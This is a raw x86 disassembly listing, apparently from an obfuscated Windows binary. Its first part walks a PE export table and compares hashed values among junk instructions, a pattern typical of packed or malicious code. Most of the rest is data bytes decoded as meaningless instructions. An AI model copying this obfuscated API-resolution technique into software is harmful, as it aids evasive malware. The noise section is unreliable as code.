  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x42fa24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x42fa28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x82da29ff,eax
  408b09:	mov    ebx,0x7be5eaf0
  408b0e:	jnp    0x408b23
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	jecxz  0x408acd
  408b15:	push   cs
  408b16:	sbb    al,0x7e
  408b18:	mov    edi,0x35627f7a
  408b1d:	loope  0x408b96
  408b1f:	jns    0x408aef
  408b21:	push   eax
  408b22:	push   ss
  408b23:	sub    BYTE PTR [eax],ah
  408b25:	or     al,0x2b
  408b27:	fwait
  408b28:	imul   edi,DWORD PTR [edi+ebx*2+0x51],0x785f3ad9
  408b30:	loopne 0x408ba3
  408b32:	sub    DWORD PTR gs:[edi+0x3ccbd098],0xa1e81118
  408b3d:	(bad)
  408b40:	or     BYTE PTR [edx+ebx*8],bh
  408b43:	enter  0x8a08,0x8e
  408b47:	sbb    ah,BYTE PTR [edi+eax*2-0x6d7ddcc9]
  408b4e:	or     esi,DWORD PTR [edx+0x6c]
  408b51:	mov    esi,0x7819fcc0
  408b56:	push   ds
  408b57:	dec    ebx
  408b58:	mov    edi,0x50a445ea
  408b5d:	stos   DWORD PTR es:[edi],eax
  408b5e:	rol    DWORD PTR [ecx-0x444fbcf0],cl
  408b64:	mov    ds:0xd9dc6eb3,eax
  408b69:	mov    bh,0x29
  408b6b:	pop    edi
  408b6c:	pop    esp
  408b6d:	cmc    
  408b6e:	inc    ebp
  408b6f:	sub    al,0x4e
  408b71:	mov    edx,0xb845eb97
  408b76:	jo     0x408b03
  408b78:	push   cs
  408b79:	pop    eax
  408b7a:	inc    ebp
  408b7b:	out    0xd9,eax
  408b7d:	stc    
  408b7e:	pop    edi
  408b7f:	mov    DWORD PTR [ebp+ebp*8-0x2e],0xbf0f7103
  408b87:	xchg   ecx,eax
  408b88:	xor    al,0x9c
  408b8a:	ins    BYTE PTR es:[edi],dx
  408b8b:	xchg   ecx,eax
  408b8c:	mov    ah,0xa9
  408b8e:	jae    0x408b85
  408b90:	test   eax,0xc0a35793
  408b95:	xor    al,0x75
  408b97:	mov    eax,0x46014575
  408b9c:	in     eax,dx
  408b9d:	lods   eax,DWORD PTR ds:[esi]
  408b9e:	add    al,0xf
  408ba0:	adc    dh,BYTE PTR [ecx+0x4f36948a]
  408ba6:	retf   
  408ba7:	mov    ss,WORD PTR [ebx-0x64]
  408baa:	cmp    BYTE PTR [ebp+0x70],bh
  408bad:	mov    ch,0x44
  408baf:	push   es
  408bb0:	xor    al,0x6
  408bb2:	jecxz  0x408b64
  408bb4:	mov    eax,0x30072ac
  408bb9:	xchg   ecx,eax
  408bba:	sub    al,0x89
  408bbc:	cmp    eax,0x33ff2e7c
  408bc1:	bound  ebp,QWORD PTR gs:[edi+eax*4-0x5920f380]
  408bc9:	xor    bh,dh
  408bcb:	jmp    esp
  408bcd:	mov    ch,0x30
  408bcf:	lea    edx,[ebp+0x68]
  408bd2:	pop    ss
  408bd3:	jecxz  0x408bd2
  408bd5:	repz scas al,BYTE PTR es:[edi]
  408bd7:	cs icebp 
  408bd9:	sbb    ch,bl
  408bdb:	scas   eax,DWORD PTR es:[edi]
  408bdc:	mov    esp,0x7a4e78fc
  408be1:	sbb    esp,ebp
  408be3:	shr    DWORD PTR [edx+0x29ce012e],cl
  408be9:	mov    dh,0xe2
  408beb:	int    0xb4
  408bed:	bound  edi,QWORD PTR [eax+0x4c]
  408bf0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bf2:	jnp    0x408bc1
  408bf4:	add    DWORD PTR [edx],ebp
  408bf6:	cmp    BYTE PTR [ebp-0x62],bl
  408bf9:	test   DWORD PTR [edi],ebp
  408bfb:	push   ecx
  408bfc:	lock js 0x408bd0
  408bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c00:	neg    BYTE PTR [edi+0x28130f7f]
  408c06:	test   DWORD PTR [edx+0x49],esp
  408c09:	xor    eax,DWORD PTR [edi+0x39]
  408c0c:	push   ecx
  408c0d:	in     eax,dx
  408c0e:	xchg   BYTE PTR [esi-0x3b810538],bl
  408c14:	xor    eax,0xeb983498
  408c19:	arpl   WORD PTR [ebp+eax*4+0x47],si
  408c1d:	dec    ecx
  408c1e:	mov    ds:0xc01da8da,eax
  408c23:	cmp    eax,0xec29cd3e
  408c28:	jo     0x408c2e
  408c2a:	adc    DWORD PTR [ecx-0x2],ebp
  408c2d:	mov    WORD PTR [esi-0x6d],ss
  408c30:	mov    al,0x21
  408c32:	push   edi
  408c33:	xchg   DWORD PTR ds:0xda60c1ad,ebx
  408c39:	pop    ebx
  408c3a:	inc    edx
  408c3b:	inc    ebp
  408c3c:	scas   al,BYTE PTR es:[edi]
  408c3d:	popa   
  408c3e:	push   0x2a
  408c40:	inc    edx
  408c41:	jge    0x408c44
  408c43:	mov    ebx,0x459fb30
  408c48:	ficomp WORD PTR [ebx+0x263f3303]
  408c4e:	dec    esi
  408c4f:	mov    WORD PTR [ebx],fs
  408c51:	jl     0x408bfd
  408c53:	inc    edx
  408c54:	std    
  408c55:	jge    0x408c11
  408c57:	pop    esi
  408c58:	mov    bl,0x39
  408c5a:	loop   0x408c0b
  408c5c:	mov    dh,0x64
  408c5e:	sbb    dh,BYTE PTR [esi]
  408c60:	int3   
  408c61:	repz push eax
  408c63:	repz cmp al,0x6b
  408c66:	fmul   st(1),st
  408c68:	jp     0x408c2c
  408c6a:	xor    esp,DWORD PTR [edi+ebx*4+0x27d67137]
  408c71:	ins    DWORD PTR es:[edi],dx
  408c72:	lods   eax,DWORD PTR ds:[esi]
  408c73:	(bad)  
  408c74:	xor    ah,ah
  408c76:	push   0x72e06cc2
  408c7b:	scas   eax,DWORD PTR es:[edi]
  408c7c:	xchg   ebp,eax
  408c7d:	pop    ebx
  408c7e:	and    ah,BYTE PTR [edx+edx*2-0x21]
  408c82:	lods   al,BYTE PTR ds:[esi]
  408c83:	repnz xchg esi,eax
  408c85:	ss fs inc ecx
  408c88:	xchg   edx,esi
  408c8a:	dec    eax
  408c8b:	leave  
  408c8c:	(bad)  
  408c8d:	(bad)  
  408c8e:	loopne 0x408c34
  408c90:	loopne 0x408c76
  408c92:	outs   dx,DWORD PTR ds:[esi]
  408c93:	xor    eax,0x1e826134
  408c98:	pop    ebp
  408c99:	pop    edx
  408c9a:	pusha  
  408c9b:	inc    esp
  408c9c:	pop    ebp
  408c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c9e:	push   cs
  408c9f:	sti    
  408ca0:	cli    
  408ca1:	jg     0x408c85
  408ca3:	push   edi
  408ca4:	into   
  408ca5:	add    DWORD PTR [edx],0xc874690d
  408cab:	pop    ds
  408cac:	push   ebp
  408cad:	mov    esi,0xa91e8f91
  408cb2:	fbld   TBYTE PTR [edx]
  408cb4:	popa   
  408cb5:	xchg   ebp,eax
  408cb6:	dec    esp
  408cb7:	jp     0x408d2b
  408cb9:	clc    
  408cba:	pop    ebp
  408cbb:	mov    dh,0xd4
  408cbd:	cmp    eax,0x195cbf73
  408cc2:	stc    
  408cc3:	jbe    0x408d06
  408cc5:	or     bh,BYTE PTR [bp+si+0xb]
  408cc9:	jmp    0x408cd6
  408ccb:	pop    ebp
  408ccc:	xor    eax,0xc69b7ba1
  408cd1:	pop    eax
  408cd2:	adc    BYTE PTR [edx],dh
  408cd4:	sub    BYTE PTR [esi+0x4a],cl
  408cd7:	mov    esp,DWORD PTR [edi+eax*8+0x4b]
  408cdb:	pop    esp
  408cdc:	mov    dh,0x8f
  408cde:	iret   
  408cdf:	imul   eax,edi,0xfffffffd
  408ce2:	dec    edi
  408ce3:	and    al,0xb9
  408ce5:	jmp    0x26de:0xb5a4746f
  408cec:	hlt    
  408ced:	sbb    esi,DWORD PTR ds:[ecx+0x54]
  408cf1:	(bad)  
  408cf2:	pop    ecx
  408cf3:	sar    ebx,0x78
  408cf6:	sbb    DWORD PTR [edi-0x4b],edi
  408cf9:	sbb    eax,0x8177f34f
  408cfe:	jle    0x408cd1
  408d00:	mov    esi,0xa8d9496d
  408d05:	adc    al,0xb3
  408d07:	mov    esp,0x1ba86804
  408d0c:	cdq    
  408d0d:	popf   
  408d0e:	ja     0x408d31
  408d10:	stc    
  408d11:	shl    BYTE PTR ds:0x27355642,cl
  408d17:	fsub   DWORD PTR [ebx]
  408d19:	push   edi
  408d1a:	push   0x40
  408d1c:	out    dx,eax
  408d1d:	or     al,0x46
  408d1f:	inc    bp
  408d21:	push   cs
  408d22:	inc    esp
  408d23:	xchg   esi,eax
  408d24:	or     eax,ecx
  408d26:	jo     0x408d64
  408d28:	dec    eax
  408d29:	or     DWORD PTR [eax],0x31
  408d2c:	xchg   ebx,eax
  408d2d:	scas   al,BYTE PTR es:[edi]
  408d2e:	cld    
  408d2f:	mov    ah,0x64
  408d31:	cmp    BYTE PTR [edx+edi*8],dh
  408d34:	xor    al,0xda
  408d36:	mov    ?,ebp
  408d38:	sbb    eax,0xd0000f33
  408d3d:	add    BYTE PTR ds:0x9a5dc818,dh
  408d43:	nop
  408d44:	(bad)  
  408d45:	or     DWORD PTR [ecx+ecx*8-0x17],esp
  408d49:	add    ebp,DWORD PTR [edi+ebx*1+0x3e01de7d]
  408d50:	ja     0x408d0b
  408d52:	pshufw mm6,QWORD PTR [eax-0x719fac71],0x5a
  408d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d5b:	jbe    0x408d01
  408d5d:	addr16 shl bl,cl
  408d60:	inc    ebx
  408d61:	add    eax,0x9bb36f24
  408d66:	push   edx
  408d67:	jnp    0x408dda
  408d69:	(bad)  
  408d6a:	pop    ecx
  408d6b:	pop    edi
  408d6c:	inc    edx
  408d6d:	push   eax
  408d6e:	mov    al,bh
  408d70:	jo     0x408dc7
  408d72:	xchg   ecx,eax
  408d73:	push   ss
  408d74:	jecxz  0x408d09
  408d76:	pop    ds
  408d77:	inc    ebx
  408d78:	dec    esi
  408d79:	push   edi
  408d7a:	dec    DWORD PTR [ebx]
  408d7c:	div    BYTE PTR [ebx]
  408d7e:	jae    0x408dfd
  408d80:	jbe    0x408d88
  408d82:	test   DWORD PTR [edi-0x2f],ecx
  408d85:	inc    ecx
  408d86:	aas    
  408d87:	sub    dh,0x16
  408d8a:	mov    esi,0xc19529c5
  408d8f:	or     DWORD PTR [eax+edi*8],eax
  408d92:	inc    ebp
  408d93:	lods   eax,DWORD PTR ds:[esi]
  408d94:	or     ah,0xea
  408d97:	add    cl,dh
  408d99:	iret   
  408d9a:	jecxz  0x408e05
  408d9c:	lods   eax,DWORD PTR ds:[esi]
  408d9d:	sti    
  408d9e:	adc    al,0x52
  408da0:	adc    eax,ebx
  408da2:	movnti DWORD PTR [ecx+0x601431a0],esi
  408da9:	mov    ds:0x77fd1aa9,al
  408dae:	sahf   
  408daf:	int3   
  408db0:	daa    
  408db1:	enter  0x359d,0x74
  408db5:	nop
  408db6:	in     al,0xff
  408db8:	pop    ecx
  408db9:	sbb    BYTE PTR [edx+ebx*1+0x26],al
  408dbd:	addr16 dec edi
  408dbf:	and    BYTE PTR [esi+0x30c0d3e5],cl
  408dc5:	and    cl,0x43
  408dc8:	cmp    al,0xf1
  408dca:	inc    edi
  408dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dcc:	sub    bl,BYTE PTR ds:0x4f1be444
  408dd2:	imul   edx,DWORD PTR [edx-0x5f],0xd1248089
  408dd9:	mul    DWORD PTR [edx-0x718bd346]
  408ddf:	mov    ebp,0x308a17cf
  408de4:	std    
  408de5:	push   0xfe18bd5d
  408dea:	ss call 0x3851:0xacbaffe5
  408df2:	mov    bl,0x93
  408df4:	or     al,0x67
  408df6:	ins    BYTE PTR es:[edi],dx
  408df7:	mov    ecx,0xd26f46eb
  408dfc:	mov    ebp,0xb158973e
  408e01:	and    DWORD PTR gs:[edi-0x6b9cae8a],0xef83dbc9
  408e0c:	cdq    
  408e0d:	out    0xae,al
  408e0f:	or     ch,ch
  408e11:	rol    BYTE PTR [ecx-0xe2c0310],0x2e
  408e18:	call   0xe3f8:0xa1f738a8
  408e1f:	mov    eax,ds:0x2a62f0de
  408e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e25:	int    0x92
  408e27:	inc    ebp
  408e28:	cwde   
  408e29:	mov    BYTE PTR [edi-0x1ac44873],dl
  408e2f:	or     bh,BYTE PTR [edi+0x543d05ae]
  408e35:	mov    esi,0x113eeef6
  408e3a:	sar    edx,cl
  408e3c:	popf   
  408e3d:	or     DWORD PTR [ebx],esp
  408e3f:	push   ebx
  408e40:	call   0xcc56:0x13e89e95
  408e47:	hlt    
  408e48:	mov    al,ds:0xe914ed45
  408e4d:	cdq    
  408e4e:	adc    DWORD PTR [esi+edx*4],esi
  408e51:	(bad)  
  408e53:	sub    ebp,ecx
  408e55:	mov    bh,0xe
  408e57:	hlt    
  408e58:	out    0x61,al
  408e5a:	xor    BYTE PTR [edx-0x21],cl
  408e5d:	test   BYTE PTR [edx+eiz*8],cl
  408e60:	fs inc esp
  408e62:	arpl   cx,di
  408e64:	lea    edx,[ecx]
  408e66:	loop   0x408e32
  408e68:	mov    dl,0x90
  408e6a:	mov    al,0x17
  408e6c:	mov    ds:0x8f543467,eax
  408e71:	rcl    BYTE PTR [edx+0x1ecdaa45],cl
  408e77:	cmp    eax,0x90f00a88
  408e7c:	fcmove st,st(4)
  408e7e:	xlat   BYTE PTR ds:[ebx]
  408e7f:	out    dx,al
  408e80:	xchg   esi,eax
  408e81:	mov    al,0x61
  408e83:	and    ebx,esi
  408e85:	mov    ah,0xe
  408e87:	push   cs
  408e88:	cld    
  408e89:	int    0x86
  408e8b:	cwde   
  408e8c:	leave  
  408e8d:	sub    eax,0x1d841706
  408e92:	sub    al,BYTE PTR [edx]
  408e94:	sti    
  408e95:	pop    esp
  408e96:	sar    DWORD PTR [ebx+0x12],cl
  408e99:	jb     0x408ef2
  408e9b:	test   eax,0xf37a44c4
  408ea0:	scas   al,BYTE PTR es:[edi]
  408ea1:	push   ebx
  408ea2:	fsub   QWORD PTR [ebx-0x54]
  408ea5:	xchg   DWORD PTR [edi+ebx*1+0x2f9cdfa0],ecx
  408eac:	mov    al,ds:0x7b767e40
  408eb1:	and    DWORD PTR [ebp+0x9beeef1],0x8f4d52a6
  408ebb:	xor    bl,cl
  408ebd:	mov    edx,0x9ecb5f46
  408ec2:	fcmovb st,st(3)
  408ec4:	(bad)  
  408ec5:	mov    al,ds:0x6b1d7cc0
  408eca:	sbb    BYTE PTR [eax-0x32b74371],cl
  408ed0:	and    esi,DWORD PTR [edi-0x49fb6934]
  408ed6:	pop    es
  408ed7:	pop    eax
  408ed8:	adc    bl,al
  408eda:	jecxz  0x408ebc
  408edc:	mov    bh,0xa0
  408ede:	or     BYTE PTR ds:0xb444e0e8,0xf6
  408ee5:	cmp    DWORD PTR [ebx+0x58a3ec25],ecx
  408eeb:	out    dx,al
  408eec:	or     edi,DWORD PTR [edi+0x13]
  408eef:	xor    BYTE PTR [edi],0xbc
  408ef2:	int    0xde
  408ef4:	cmp    BYTE PTR [ebp-0x8c664f9],0xbc
  408efb:	stos   BYTE PTR es:[edi],al
  408efc:	jb     0x408f33
  408efe:	inc    esi
  408eff:	xlat   BYTE PTR ds:[ebx]
  408f00:	dec    edx
  408f01:	inc    ecx
  408f02:	out    0x64,eax
  408f04:	arpl   WORD PTR [edx],cx
  408f06:	je     0x408f1d
  408f08:	int    0xd0
  408f0a:	fdivr  QWORD PTR [ebp+0x3cbc6d29]
  408f10:	or     al,0xd7
  408f12:	gs push edx
  408f14:	pop    DWORD PTR [esi]
  408f16:	add    DWORD PTR [edx+edx*4-0x48],edx
  408f1a:	call   eax
  408f1c:	add    DWORD PTR es:[ecx+0x1d],esp
  408f20:	jb     0x408f81
  408f22:	mov    ecx,0x3d050cc
  408f27:	adc    al,0x43
  408f29:	ins    DWORD PTR es:[edi],dx
  408f2a:	sub    bl,BYTE PTR [esp+edx*1+0x3cdbc6de]
  408f31:	fild   WORD PTR [eax-0x17c36569]
  408f37:	push   cs
  408f38:	sbb    BYTE PTR [ebp-0x51],ch
  408f3b:	jnp    0x408f81
  408f3d:	push   eax
  408f3e:	push   ecx
  408f3f:	inc    esp
  408f40:	arpl   WORD PTR [ebp+edi*1+0x5],bp
  408f44:	div    DWORD PTR [eax]
  408f46:	imul   eax,DWORD PTR [ebx],0xffffffd0
  408f49:	into   
  408f4a:	rcl    esp,1
  408f4c:	push   esi
  408f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f4e:	jmp    0x408f2b
  408f50:	adc    bl,BYTE PTR [eax*1+0x411c83f4]
  408f57:	fdiv   QWORD PTR [ebx+0x3963e55a]
  408f5d:	dec    ebx
  408f5e:	retf   0xf996
  408f61:	add    al,0x85
  408f63:	dec    eax
  408f64:	xchg   ebp,eax
  408f65:	pop    es
  408f66:	cmp    ch,BYTE PTR [edx+ecx*4-0x65]
  408f6a:	sahf   
  408f6b:	and    DWORD PTR [ebp-0x5626b8c8],ebp
  408f71:	sub    ebp,DWORD PTR ds:0xbe01973f
  408f77:	lds    esp,FWORD PTR [ecx+eax*2-0x29]
  408f7b:	lods   al,BYTE PTR ds:[esi]
  408f7c:	lahf   
  408f7d:	stc    
  408f7e:	dec    esi
  408f7f:	shl    BYTE PTR [edx],cl
  408f81:	and    BYTE PTR [eax],ah
  408f83:	inc    esi
  408f84:	inc    ecx
  408f85:	xor    esp,DWORD PTR [ecx-0x6a]
  408f88:	in     eax,dx
  408f89:	mov    edx,0xfda2cea
  408f8e:	and    eax,0x69c8e69b
  408f93:	aaa    
  408f94:	or     eax,0xde98102
  408f99:	add    BYTE PTR [ebx-0x1b],dh
  408f9c:	iret   
  408f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f9e:	stc    
  408f9f:	enter  0xcd80,0xdd
  408fa3:	mov    bl,0xe5
  408fa5:	lods   al,BYTE PTR ds:[esi]
  408fa6:	(bad)  [ebx]
  408fa8:	idiv   BYTE PTR [edi+0x5270bdde]
  408fae:	sar    DWORD PTR [ecx+0x79],0xc0
  408fb2:	sti    
  408fb3:	fsubr  DWORD PTR [ebx]
  408fb5:	sbb    esp,edx
  408fb7:	les    ecx,FWORD PTR [eax-0x33]
  408fba:	pop    esp
  408fbb:	jecxz  0x40902e
  408fbd:	or     eax,0x4a988f45
  408fc2:	mov    gs,ebp
  408fc4:	adc    al,0x97
  408fc6:	push   edi
  408fc7:	pop    ds
  408fc8:	jb     0x408f65
  408fca:	pop    edi
  408fcb:	xchg   edi,eax
  408fcc:	xchg   esp,eax
  408fcd:	cmc    
  408fce:	outs   dx,BYTE PTR ds:[esi]
  408fcf:	ja     0x408fc1
  408fd1:	jecxz  0x40900c
  408fd3:	aad    0x6a
  408fd5:	jmp    0x409030
  408fd7:	mov    ebx,0x33219cd5
  408fdc:	xor    bh,BYTE PTR [ecx]
  408fde:	mov    WORD PTR [esi+0x7f],?
  408fe1:	jl     0x408fe7
  408fe3:	sbb    eax,0xe64abceb
  408fe8:	cmp    DWORD PTR [esi-0x8],edi
  408feb:	dec    dl
  408fed:	ret    0x40ec
  408ff0:	xchg   ebx,eax
  408ff1:	test   DWORD PTR [ebp+0x34a28033],edx
  408ff7:	jmp    0x409001
  408ff9:	mov    esi,0x7bdcb7d5
  408ffe:	or     esi,DWORD PTR [ecx]
  409000:	sbb    al,BYTE PTR [esi-0x71cc230f]
  409006:	scas   al,BYTE PTR es:[edi]
  409007:	jmp    0x409000
  409009:	pop    edx
  40900a:	sub    edx,DWORD PTR [ebx]
  40900c:	inc    esi
  40900d:	repz adc eax,0x43965b9f
  409013:	push   edi
  409014:	cwde   
  409015:	les    edx,FWORD PTR [ecx]
  409017:	cwde   
  409018:	(bad)  
  409019:	(bad)  
  40901a:	mov    dh,0x8e
  40901c:	ds or  al,0xb3
  40901f:	or     BYTE PTR [eax-0x7253bd5a],dl
  409025:	(bad)  
  409026:	fisttp QWORD PTR [edi+0x3]
  409029:	call   0x2a9fe80c
  40902e:	clc    
  40902f:	cmp    al,0x8d
  409031:	inc    esi
  409032:	mov    ebp,0xf565da3
  409037:	inc    ebx
  409038:	sub    ebx,eax
  40903a:	ret    0xf4c6
  40903d:	aas    
  40903e:	xor    DWORD PTR [edx-0x13a28652],edi
  409044:	shr    BYTE PTR [ebx+0x3f0753bd],0x6d
  40904b:	mov    ds:0x55ffd2ba,eax
  409050:	sub    eax,0xa8888662
  409055:	mov    ds:0x96a8a6c8,eax
  40905a:	stos   BYTE PTR es:[edi],al
  40905b:	inc    ecx
  40905c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40905e:	push   eax
  40905f:	sub    ch,BYTE PTR [ebp+eax*8+0x18]
  409063:	enter  0x37e7,0xa9
  409067:	and    eax,0xc8a09370
  40906c:	cmp    al,0x24
  40906e:	xchg   edi,eax
  40906f:	ds test eax,0x1e6c318a
  409075:	add    BYTE PTR [ebx],ah
  409077:	cmp    al,0x93
  409079:	sub    al,0xa7
  40907b:	push   ds
  40907c:	dec    esi
  40907d:	or     eax,0x3d4381fa
  409082:	test   al,0x78
  409084:	pop    edi
  409085:	xlat   BYTE PTR ds:[ebx]
  409086:	out    dx,eax
  409087:	test   BYTE PTR [eax],dl
  409089:	fadd   QWORD PTR [esi-0x11]
  40908c:	dec    ebp
  40908d:	pop    esp
  40908e:	inc    esi
  40908f:	sahf   
  409090:	pop    ebx
  409091:	mov    esp,0x98c24540
  409096:	ret    0x6f06
  409099:	and    al,0xea
  40909b:	jne    0x40904b
  40909d:	popa   
  40909e:	xor    BYTE PTR [esi+ebp*4+0x1],bl
  4090a2:	aas    
  4090a3:	test   eax,0x2c5af89e
  4090a8:	cmp    BYTE PTR [ebx+0x235e8434],al
  4090ae:	adc    al,0x36
  4090b0:	(bad)
  4090b3:	jge    0x409078
  4090b5:	outs   dx,BYTE PTR ds:[esi]
  4090b6:	pop    ss
  4090b7:	jge    0x409051
  4090b9:	sub    dh,ch
  4090bb:	cmp    bl,BYTE PTR [ebx-0x75]
  4090be:	rcl    BYTE PTR [eax+0xb],cl
  4090c1:	cmc    
  4090c2:	push   esp
  4090c3:	in     al,dx
  4090c4:	mov    dl,dh
  4090c6:	pop    ds
  4090c7:	dec    ebp
  4090c8:	aad    0x42
  4090ca:	sbb    BYTE PTR [edx],ah
  4090cc:	mov    edx,0xc448b87b
  4090d1:	xchg   edi,edx
  4090d3:	jp     0x409055
  4090d5:	and    DWORD PTR [ebx],eax
  4090d7:	or     ch,BYTE PTR [edx+0x238dfff8]
  4090dd:	(bad)  
  4090df:	cmp    ebp,DWORD PTR [esi-0x16]
  4090e2:	pop    ecx
  4090e3:	xor    al,0x3f
  4090e5:	out    dx,al
  4090e6:	cmp    eax,0xede341d2
  4090eb:	jmp    0x409148
  4090ed:	pop    ecx
  4090ee:	jge    0x40909e
  4090f0:	les    edi,FWORD PTR [ebx]
  4090f2:	add    ecx,esi
  4090f4:	nop
  4090f5:	fstp   st(7)
  4090f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090f8:	sbb    al,0xd0
  4090fa:	cli    
  4090fb:	scas   eax,DWORD PTR es:[edi]
  4090fc:	sub    DWORD PTR [edi],0xde489cfd
  409102:	aaa    
  409103:	stos   DWORD PTR es:[edi],eax
  409104:	pop    edx
  409105:	xchg   ebp,eax
  409106:	xchg   esi,eax
  409107:	sbb    al,0x59
  409109:	add    DWORD PTR [edi+0xc],0x31df20a0
  409110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409111:	(bad)  
  409112:	shl    DWORD PTR [edi-0x61],cl
  409115:	and    dl,bh
  409117:	jp     0x4090ab
  409119:	add    ecx,edi
  40911b:	loope  0x40912f
  40911d:	into   
  40911e:	cmp    BYTE PTR [ecx-0x7d],bl
  409121:	pushf  
  409122:	xor    ebp,ecx
  409124:	(bad)  
  409125:	std    
  409126:	iret   
  409127:	repnz push ebx
  409129:	xor    esi,DWORD PTR [ebx-0x4ba6f847]
